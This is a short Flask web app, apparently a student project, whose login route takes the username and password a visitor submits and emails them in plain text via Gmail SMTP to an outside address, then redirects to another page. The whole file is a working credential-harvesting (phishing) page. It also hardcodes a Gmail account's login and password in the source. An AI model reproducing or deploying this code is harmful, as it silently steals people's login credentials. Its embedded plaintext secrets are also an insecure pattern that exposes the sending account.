from flask import Flask, render_template, request
import yagmail


app = Flask(__name__)

@app.route('/')
def home_page():
  return render_template('index.html')

@app.route('/about')
def about_page():
  return render_template('about.html')

@app.route('/login', methods = ['GET', 'POST'])
def login_page():
  if request.method == 'POST':
    user = request.form['username_input_box']
    pwd = request.form['pwd_input_box']
    # print('username: ' + user + '   password: ' + pwd)
    yag = yagmail.SMTP(user='peterpipinstall@gmail.com', password='pipinstall', host='smtp.gmail.com')
    # Adding in the details
    toRec = "gw14galbraithpeter2@glow.ea.glasgow.sch.uk"
    subjectLine = "A test email"
    body = ["username: ", user, "\tpassword: ", pwd]
    # Delivery
    yag.send(to=toRec, subject=subjectLine, contents=body)
    print('email sent')
    return render_template('about.html')
  else:
    return render_template('login.html')
  